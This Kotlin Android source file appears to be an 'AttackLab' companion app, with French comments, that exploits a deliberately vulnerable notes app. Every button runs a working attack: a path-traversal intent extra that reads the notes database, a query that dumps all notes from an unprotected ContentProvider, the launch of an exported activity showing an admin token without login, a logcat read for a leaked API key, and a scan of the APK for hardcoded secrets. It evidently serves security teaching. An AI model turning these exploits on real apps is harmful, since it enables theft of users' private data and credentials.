package com.lab.attacklab

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val txt by lazy { findViewById<TextView>(R.id.txtResult) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)



        // C1 : path traversal — on fait lire la base notes.db par NoteDetailActivity
        findViewById<Button>(R.id.btnC1).setOnClickListener {
            try {
                val i = Intent()
                i.setClassName("com.lab.securenotes", "com.lab.securenotes.NoteDetailActivity")
                i.putExtra("cheminFichier", "../../databases/notes.db")
                startActivity(i)
                txt.text = "C1 → NoteDetailActivity forcée à lire ../../databases/notes.db (regarde l'écran SecureNotesLab : la base, dont la note de bob, s'affiche)."
            } catch (e: Exception) { txt.text = "C1 → ${e.message}" }
        }

        // C2/C3 : ContentProvider — lire toutes les notes (permission 'normal' auto-accordée)
        findViewById<Button>(R.id.btnC2).setOnClickListener {
            val res = try {
                val c = contentResolver.query(
                    Uri.parse("content://com.lab.securenotes.provider"),
                    null, null, null, null
                )
                val sb = StringBuilder()
                c?.use {
                    while (it.moveToNext()) {
                        val p = it.getString(it.getColumnIndexOrThrow("proprietaire"))
                        val ct = it.getString(it.getColumnIndexOrThrow("contenu"))
                        sb.append("[$p] $ct\n")
                    }
                }
                if (sb.isEmpty()) "Aucune donnée (accès refusé)" else "Notes lues (toutes) :\n$sb"
            } catch (e: Exception) { "Erreur : ${e.message}" }
            txt.text = "C2/C3 → $res"
        }
        // C4 : Activity sensible exportée — profil admin + token, sans connexion
        findViewById<Button>(R.id.btnC4).setOnClickListener {
            try {
                val i = Intent()
                i.setClassName("com.lab.securenotes", "com.lab.securenotes.ProfilActivity")
                startActivity(i)
                txt.text = "C4 → ProfilActivity ouverte : token + niveau administrateur affichés sans aucune connexion."
            } catch (e: Exception) { txt.text = "C4 → ${e.message}" }
        }
        // C5 : lire les journaux (clé API journalisée par SecureNotesLab)
        findViewById<Button>(R.id.btnC5).setOnClickListener {
            val res = try {
                val p = Runtime.getRuntime().exec(arrayOf("logcat", "-d", "-t", "400"))
                val out = p.inputStream.bufferedReader().readText()
                val l = out.lines().filter {
                    it.contains("SecureNotesLab") && (it.contains("SNL-SYNC") || it.contains("key") || it.contains("clé"))
                }
                if (l.isNotEmpty()) "Clé lue dans les logs : ${l.first().takeLast(55)}"
                else "AttackLab ne voit pas les logs de SecureNotesLab (une appli tierce ne lit que ses propres logs sur Android moderne). La clé reste visible via 'adb logcat'."
            } catch (e: Exception) { "Erreur : ${e.message}" }
            txt.text = "C5 → $res"
        }

        // C6 : secrets codés en dur extraits de l'APK
        findViewById<Button>(R.id.btnC6).setOnClickListener {
            val cibles = listOf("SNL-SYNC-98213", "demo_token_C7F2")
            val res = try {
                val apk = packageManager.getApplicationInfo("com.lab.securenotes", 0).sourceDir
                val zip = java.util.zip.ZipFile(apk)
                val trouves = mutableListOf<String>()
                val e = zip.entries()
                while (e.hasMoreElements()) {
                    val en = e.nextElement()
                    if (en.name.endsWith(".dex")) {
                        val t = String(zip.getInputStream(en).readBytes(), Charsets.ISO_8859_1)
                        for (cible in cibles) if (t.contains(cible) && !trouves.contains(cible)) trouves.add(cible)
                    }
                }
                zip.close()
                if (trouves.isEmpty()) "Aucun secret trouvé" else "Secrets TROUVÉS en clair dans l'APK : ${trouves.joinToString()}"
            } catch (e: Exception) { "Erreur : ${e.message}" }
            txt.text = "C6 → $res"
        }


    }
}
